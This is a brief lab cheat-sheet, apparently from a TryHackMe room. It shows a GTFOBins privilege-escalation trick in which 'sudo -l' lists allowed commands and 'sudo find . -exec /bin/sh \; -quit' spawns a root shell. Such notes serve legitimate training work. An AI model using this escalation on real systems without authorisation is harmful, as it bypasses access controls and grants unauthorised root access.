# sudo find Shell Escape (GTFOBins)

```bash
sudo -l                                    # check what you can run as root first
sudo /usr/bin/find . -exec /bin/sh \; -quit
```

Same pattern applies to any binary with a GTFOBins sudo entry — always check `sudo -l` before anything else post-shell.

— TryHackMe / Operation Promotion
